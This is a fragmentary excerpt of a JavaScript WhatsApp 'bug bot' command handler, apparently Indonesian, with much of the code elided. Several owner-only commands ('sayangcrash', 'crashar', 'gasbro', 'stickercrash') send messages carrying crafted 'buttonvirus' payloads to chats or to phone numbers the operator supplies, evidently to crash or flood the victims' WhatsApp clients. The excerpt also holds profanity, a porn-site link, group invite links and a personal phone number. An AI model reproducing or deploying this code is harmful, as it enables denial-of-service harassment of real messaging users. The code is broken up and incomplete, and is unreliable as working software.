...
const { dhaffmods } = require('./pirtex/ranzmods')
...
anuxx = `
GROUP 1
https://chat.whatsapp.com/KCMvdghiofF0R1HlgoGAew

GROUP 2
https://chat.whatsapp.com/GToAFWm7W6g9noPQi08Qba`
m.reply(anuxx)
}
break
case 'getsxvdxcmd': {
...
//case hacker
            case 'kelentod':
            kelentod = `.`
            DhaffNetwork.sendMessage(m.chat, {text: kelentod})
            break
            case 'pe':
...
DhaffNetwork.sendMessage(m.chat, buttonMessage)
               break
 case 'hallo_sayang':
if (!isCreator) throw mess.owner
kontolu = '``🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥``',
DhaffNetwork.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${bugweb}`,body: '🔥 𝐁𝐔𝐆 - 𝐓𝐁𝐂 - 𝐖𝐀 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
break
case 'dok':
if (!isCreator) throw mess.owner
y1 = fs.readFileSync('./pirtex/iphone.mp3')
DhaffNetwork.sendMessage(m.chat, {document: y1, fileName: `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥 .${buttonvirus}.mp3`, quoted: m})
break
case 'dhaffaja' : {
if (!isCreator) throw mess.owner
connecting = dhaff
...
dhafflistmessagebug = [
                ...
                DhaffNetwork.sendListMsg(m.chat, `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, dhaff.user.name, `Hay Ngentod`, `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, dhafflistmessagebug, m)
break
case 'dhafftag': {
                if (!isCreator) throw mess.owner
         ...
         case 'sayangcrash':               
          if (!isCreator) throw mess.owner
            ...
            DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
            break
            case 'gasbro':
                if (!isCreator) throw mess.owner
                ...
                DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:gasbugpc})
                m.reply(`succes`)
                ...
                case 'gasbtt':
                 ...
                 buttonspc = [
                    ...
                    buttonMessagepc = {
                      ...
                      DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      m.reply(`succes`)
                    break
                    case 'crashar':               
          if (!isCreator) throw mess.owner
            ...
            await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
            await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
            await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
            await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
            await DhaffNetwork.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
...
"title": `𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅 🔥➥ ${buttonvirus}`,

"description": `© 𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅 ${buttonvirus}`,

"currencyCode": "IDR",

"footerText": `© 𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅`,
...
"url": "wa.me/6283824417034"

},

"businessOwnerJid": "6283824417034@s.whatsapp.net",
...
case 'stickercrash':
if (!isCreator) throw mess.owner
if (!text) throw `MANA NOMERNYA PANTEX`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅${philips}`,
"jpegThumbnail":thumb,
"orderTitle": `© 𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅${philips}`,
...
"inviteExpiration": `© 𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅-${buttonvirus}`,
						"groupName": `© 𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅-${buttonvirus}`,
						"caption": "https://chat.whatsapp.com/LOnlsW6HQ9W9c6glZ0EZvV",
...
case 'assalamualaikum': case 'asalamualaikum': case 'samlekom':
                    DhaffNetwork.sendMessage(m.chat, {audio:  fs.readFileSync('./galery/audio/salam.mp3'), mimetype: 'audio/mp4', ptt:true}, {quoted:m})
break
case 'mastah': case 'lord':
                     DhaffNetwork.sendMessage(m.chat, {audio:  fs.readFileSync('./galery/audio/mastah.mp3'), mimetype: 'audio/mp4', ptt:true}, {quoted:m})
break
case 'anjing': case 'asu': case 'bokep': case 'ngentot': case 'kontol':
                      DhaffNetwork.sendMessage(m.chat, {audio:  fs.readFileSync('./galery/audio/tobat.mp3'), mimetype: 'audio/mp4', ptt:true}, {quoted:m})
break
case 'gameninjabox':
	   if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
